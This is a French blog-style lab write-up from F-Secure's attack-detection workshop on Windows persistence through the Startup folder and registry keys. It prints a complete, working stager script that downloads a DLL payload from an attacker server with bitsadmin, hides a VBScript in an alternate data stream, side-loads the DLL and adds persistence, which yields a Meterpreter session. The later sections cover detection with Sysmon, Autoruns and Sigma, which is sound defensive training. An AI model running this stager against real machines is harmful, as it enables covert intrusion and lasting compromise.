---
layout: post
title: Attack Detection Fundamentals - Persistence 
subtitle: Workshop de F-Secure - Startup Folder & Run Keys
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
tags: [Astaroth, Persistence, Windows, Startup Folder, Registry, regedit, Run Keys, HKCU, HKLM, Red Team, Blue Team, MITRE ATT&CK, Autoruns, Sysinternals, Sysmon, Sigma]
---

![865390e4ac68e667e3bdd7153acf508a.png](/img/865390e4ac68e667e3bdd7153acf508a.png)

Nous continuons dans cet article la série *Code Execution and Persistence* du workshop *Attack Detection Fundamentals* de F-Secure.

Après avoir exécuté du code en imitant les [TTP utilisés par le malware Astaroth dans le dernier lab](https://0xss0rz.github.io/2021-01-09-Attack-Detection-Code-Execution/){:target="_blank"}, nous poursuivons avec la troisème étape du framework MITRE ATT&CK, la phase de persistance. [1]

{: .box-note}
***Persistence** consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.* [2]

Dans ce lab, nous allons utiliser deux techniques de persistance bien connues qui consistent à ajouter du code au processus de démarrage en modifiant les clés d'exécution du registre ou le dossier de démarrage. [3,4,5,6]

![feb38eaeaae8bec7a05315c3de8453b8.png](/img/bba18d38c2614bb8b7d4f58142899a09.png)

**Dossier *Startup*:**

Une méthode de persistance consiste à créer un exécutable dans le dossier "Startup"

![365ba2a40bc2c30cdba4ec03f777cdff.png](/img/a2f010d15e9d4620b39a25f805c4a022.png)
Source: [6]

Path: `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`

Exécution avec les privilèges de l'utilisateur.

Dans le cas de privilèges administrateur: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

Dans ce cas, le payload s'exécute à chaque fois qu'un utilisateur se log

**Registry Run Keys:**

En ajoutant une entrée au registre "Run Keys", il est possible de faire exécuter du code chaque fois que le système démarre ou que l'utilisateur se connecte. [7,8,9,10]

Cette méthode est utilisée par plusieurs malware dont Trickbot [11]

![a7aae36a3ed9eb5a9a2d23ca9cf90ba9.png](/img/cec03572036e472f8f0ba590fa50a958.png)

- `HKEY_CURRENT_USER` (HKCU)

Les entrées ajoutées aux *Run Keys* du *Current User Registry Hive* (HKCU) sont exécutées à chaque démarrage de l'utilisateur.

Emplacements les plus courants:

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
```

Commande pour ajouter une clé: `REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v <name> /t REG_SZ /d <filepath>`

- `HKEY_LOCAL_MACHINE` (HKLM)

L'ajout d'une entrée dans les *Run Keys* du *System or Local Machine Registry Hive* (HKLM) permet l'exécution à chaque fois qu'un utilisateur se connecte.

Emplacements:

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
```

Commande: `REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v <name> /t REG_SZ /d <filepath>`

Autres emplacements:

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```

Dans le cas du malware Astaroth, les attaquants utilisent `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`

# Lab

Dans ce lab, nous reprenons le même setup que dans le [lab précédent](https://0xss0rz.github.io/2021-01-09-Attack-Detection-Code-Execution/){:target="_blank"} soit une VM Kali et une VM Win 7.

Nous utiliserons également la même méthode que dans le lab précédent pour l'exécution de code (abus de ADS, DLL Side-Loading, abus de BITSAdmin et d'ExtExport). 

Toutefois, nous modifierons le stager afin d'y ajouter les deux méthodes de persistance suivantes:

1. Ajout du payload dans le dossier de démarrage

`copy <filepath> "C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\<filename>"`

2. Création d'une clé de registre pointant sur le payload

`REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /f /v StartUp /t REG_SZ /d <filepath>`

Flags:

/f - ajouter l'entrée sans demander de confirmation.
/v - nom de l'entrée.
/t - type de l'entrée.
/d - données de l'entrée.

**Stager v2 Code:**

Le nouveau stager `stager.cmd` devient:

```
@echo off

setlocal enabledelayedexpansion

set SERVER=http://<IP>/

set PATH_PUBLIC_DIR=C:\Users\Public\Libraries\raw\
rem Create the target directoty if it does not exist.
if not exist "%PATH_PUBLIC_DIR%" mkdir %PATH_PUBLIC_DIR%

set PAYLOAD_DLL=payload.dll
set TARGET_ADS=desktop.ini
set LAUNCHER_LNK=launcher.lnk
set LAUNCHER_CREATE_VBS=launcher_create.vbs

set URL_PAYLOAD_DLL=%SERVER%%PAYLOAD_DLL%

rem ExtExport.exe looks for any DLL with the following names.
set EXTEXPORT_DLLS[1]=mozcrt19.dll
set EXTEXPORT_DLLS[2]=mozsqlite3.dll
set EXTEXPORT_DLLS[3]=sqlite3.dll

rem Select one DLL filename at random.
set /a _rand=%RANDOM% %% 3 + 1
set EXTEXPORT_DLL=!EXTEXPORT_DLLS[%_rand%]!

set PATH_EXTEXPORT_DLL=%PATH_PUBLIC_DIR%%EXTEXPORT_DLL%
set PATH_LAUNCHER_LNK=%PATH_PUBLIC_DIR%%LAUNCHER_LNK%
set PATH_LAUNCHER_CREATE_VBS=%PATH_PUBLIC_DIR%%LAUNCHER_CREATE_VBS%

set PATH_LAUNCHER_CREATE_ADS=%PATH_PUBLIC_DIR%%TARGET_ADS%:%LAUNCHER_CREATE_VBS%

set PATH_EXTEXPORT_EXE=C:\Program Files\Internet Explorer\Extexport.exe
set EXTEXPORT_ARGS=C:\Users\Public\Libraries\raw foo bar

rem Download the renamed DLL payload from the server.
bitsadmin /transfer 2 /priority FOREGROUND %URL_PAYLOAD_DLL% %PATH_EXTEXPORT_DLL%

rem Use a temporary VBScript to create the LNK launcher.
rem The launcher will take the renamed DLL payload and load it using ExtExport.
echo Set oWS = WScript.CreateObject("WScript.Shell") > %PATH_LAUNCHER_CREATE_VBS%
echo sLinkFile = "%PATH_LAUNCHER_LNK%" >> %PATH_LAUNCHER_CREATE_VBS%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %PATH_LAUNCHER_CREATE_VBS%
echo oLink.TargetPath = "%PATH_EXTEXPORT_EXE%" >> %PATH_LAUNCHER_CREATE_VBS%
echo oLink.Arguments = "%EXTEXPORT_ARGS%" >> %PATH_LAUNCHER_CREATE_VBS%
echo oLink.Save >> %PATH_LAUNCHER_CREATE_VBS%

rem Copy the launcher creation VBScript to the Alternate Data Stream (ADS) of desktop.ini and erase it.
type %PATH_LAUNCHER_CREATE_VBS% > %PATH_LAUNCHER_CREATE_ADS% && erase %PATH_LAUNCHER_CREATE_VBS%

rem Execute the launcher creation VBScript from the Alternate Data Stream (ADS).
cscript %PATH_LAUNCHER_CREATE_ADS%

rem #############################################################################

rem Persistence Code Added Here
rem ---------------------------

rem Copy the Launcher to the user's startup folder.
copy %PATH_LAUNCHER_LNK% "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%LAUNCHER_LNK%"

rem Add a registry key to the run keys in the user registry hive.
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /f /v StartUp /t REG_SZ /d %PATH_LAUNCHER_LNK%

rem ###########################################################################

rem Execute the LNK launcher. This will use ExtExport.exe to side load and execute the DLL payload.
start /b %PATH_LAUNCHER_LNK%
```

**Schéma de l'attaque:**

![d4af0aa956d9338bf97215f3a5dc1d07.png](/img/e7ae134774884b9aa0e38b7e37aee642.png)
Source: [1]

Après avoir modifié le stager, relancer l'attaque sur la VM Win 7

Résultat:

![1bf2c0285711f0ef2448ca17e3632242.png](/img/677599d1dcb14f188b64b0f0471cda5a.png)

On a une session Meterpreter. 

On peut voir que le fichier `launcher.lnk` a bien été copié dans le fichier de démarrage:

![512ae6ea422a67a4b17b1eeebd9df665.png](/img/cf5cf3229d3a4cadbc029a30053b0f82.png)

Lancer regedit en tant qu'admin et aller à `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`

![2031605a803067a4009355ec7d29a7aa.png](/img/4b0cd718d18947eab78dbe48c99a8c3f.png)

On voit que la clé `Startup` contient le path du payload `C:\Users\Public\Libraries\raw\launcher.lnk`

Redémarrer la VM Win 7 et se loguer avec le même utilisateur. Entre temps relancer le listener.

Résultat:

![b3fd1ea2bb4f5ed1ff491862564a3364.png](/img/2ba80942a0214627864d020b9bce9131.png)

On a une nouvelle session après le redémarrage de la VM Win 7.

# Analyse

**Autoruns de Sysinternals:**

Normalement on devrait avoir des indicateurs sur les fichiers exécutés au démarrage en utilisant Autoruns [11,12]. 

**Sysmon:**

Afin de détecter cette attaque, nous avons besoin de loguer les evenements Sysmon 11, 12 et 13 [13]

- EID 11: File Creation
- EID 12 et 13: Registry Key Changes

Pour cela on va utiliser le fichier de configuration Sysmon [sysmonconfig.xml](https://github.com/olafhartong/sysmon-configs/blob/master/sysmonconfig.xml){:target="_blank"} [14, 15]:

`sysmon -i sysmonconfig.xml`

![590baae2ccfb2add0c39298fc10f8ceb.png](/img/9f778fbb72c146e1984bf59b9dfb7205.png)

Résultat:

![6f39214a3377d3e46ddabbc22edf8a72.png](/img/d240b859e9834d68ace8533145cd0b38.png)

Pour le moment, on ne trouve pas d'événements 12 ou 13 car les règles de config de Sysmon qu'on vient d'installer sont trop restrictives..

On modifie `sysmonconfig.xml` pour y ajouter une nouvelle règle afin de loguer les événements liés aux registres: (Shell Folders)

![49bcc129824fa93e48a60cd9cc3886c3.png](/img/2f700d9f992344598b7ad748ecbb863c.png)

Reconfigurer sysmon: `sysmon -u` puis `sysmon -i sysmonconfig.xml`

Relancer l'attaque (penser à enlever la clé Startup dans Regedit et à clearer le dossier Startup avant de relancer l'attaque)

Résultats:

- Evt id 12:

![9562b3e0c813fba541347322a1c7c135.png](/img/915e167a7ecd4addb38e620c8161ddd9.png)

- Evt id 13:

![1a20e0c3dd29742003931802c16939c0.png](/img/958e0f104c2d4703a14e27405ee2645a.png)

- Evt id 1:

![c7e437f65335293176f1db303cfc0fba.png](/img/cfe71d3196ab4df78d694152fea9b901.png)

**Règle Sigma:**

Génération de la règle en powershell:

![6c8f206965d928258703b3b6e13c2e0a.png](/img/fc3f7a2fc5cc45d682be3b5373fbe965.png)

Ne détecte rien car dans notre cas le path est `CurrentVersion\Explorer\Shell Folders`

![dacbb25ca6a10edd9cd041a9954f8231.png](/img/a9cd878a06a2409fad8bafc2cef78020.png)

# Conclusion

Dans ce lab, nous avons étudié deux méthodes de persistance: la création de fichier dans le dossier Startup et l'utilisation de clé de registres.

Ces attaques sont détectables, notamment en analysant le fichier journal Sysmon. Toutefois, il convient de configurer correctement Sysmon pour collecter tous les événements pertinents pour l'analyse.

# Références

[1] F-Secure, *Attack Detection Fundamentals: Code Execution and Persistence - Lab #2*, [https://labs.f-secure.com/blog/attack-detection-fundamentals-code-execution-and-persistence-lab-2](https://labs.f-secure.com/blog/attack-detection-fundamentals-code-execution-and-persistence-lab-2){:target="_blank"}

[2] MITRE ATT&CK, *Persistence*, [https://attack.mitre.org/tactics/TA0003/](https://attack.mitre.org/tactics/TA0003/){:target="_blank"}

[3] RedCanary, *Windows Registry Attacks: Knowledge Is the Best Defense*, [https://redcanary.com/blog/windows-registry-attacks-threat-detection/](https://redcanary.com/blog/windows-registry-attacks-threat-detection/){:target="_blank"}

[3] Cyberg Security, *Hunting for Persistence: Registry Run Keys / Startup Folder*, [https://www.cyborgsecurity.com/cyborg_labs/hunting-for-persistence-registry-run-keys-startup-folder/](https://www.cyborgsecurity.com/cyborg_labs/hunting-for-persistence-registry-run-keys-startup-folder/){:target="_blank"}

[4] MITRE ATT&CK, *Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder*, [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/){:target="_blank"}

[5] Azeria, *Persistence*, [https://azeria-labs.com/persistence/](https://azeria-labs.com/persistence/){:target="_blank"}

[6] Microsoft, *Run and RunOnce Registry Keys*, [https://docs.microsoft.com/en-gb/windows/win32/setupapi/run-and-runonce-registry-keys?redirectedfrom=MSDN](https://docs.microsoft.com/en-gb/windows/win32/setupapi/run-and-runonce-registry-keys?redirectedfrom=MSDN){:target="_blank"}

[7] FuzzySecurity, *Windows Userland Persistence Fundamentals*, [https://www.fuzzysecurity.com/tutorials/19.html](https://www.fuzzysecurity.com/tutorials/19.html){:target="_blank"}

[8] Blackberry, *Windows Registry Persistence, Part 2: The Run Keys and Search-Order*, [https://blogs.blackberry.com/en/2013/09/windows-registry-persistence-part-2-the-run-keys-and-search-order](https://blogs.blackberry.com/en/2013/09/windows-registry-persistence-part-2-the-run-keys-and-search-order){:target="_blank"}

[9] Pentester Lab, *Persistence – Registry Run Keys*, [https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/){:target="_blank"}

[10] MBC Project, *Registry Run Keys / Startup Folder*, [https://github.com/MBCProject/mbc-markdown/blob/master/persistence/registry-run-startup.md](https://github.com/MBCProject/mbc-markdown/blob/master/persistence/registry-run-startup.md){:target="_blank"}

[11] Microsoft, *Autoruns for Windows v13.98*, [https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns){:target="_blank"}

[12] HowToGeek, *Using Autoruns to Deal with Startup Processes and Malware*, [https://www.howtogeek.com/school/sysinternals-pro/lesson6/](https://www.howtogeek.com/school/sysinternals-pro/lesson6/){:target="_blank"}

[13] Microsoft, *Sysmon v12.03*, [https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon){:target="_blank"}

[14] *Sysinternals Tool Sysmon Usage Tips and Tricks*, [https://blog.51sec.org/2018/09/sysmon-usage-tips-and-tricks.html](https://blog.51sec.org/2018/09/sysmon-usage-tips-and-tricks.html){:target="_blank"}

[15] Sophos, *How to install and use Sysmon for malware investigation*, [https://support.sophos.com/support/s/article/KB-000038882?language=en_US](https://support.sophos.com/support/s/article/KB-000038882?language=en_US){:target="_blank"}

**Poursuivez avec :** 

- [SSH Port Forwarding - Cheat Sheet](https://0xss0rz.github.io/2020-11-21-SSH-Tunneling/)

- [Attack Detection Fundamentals - Initial Access Lab 3](https://0xss0rz.github.io/2021-01-06-Attack-Detection-Initial-Access-3/)

- [Hack The Box - Remote](https://0xss0rz.github.io/2020-08-23-HTB-Remote/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
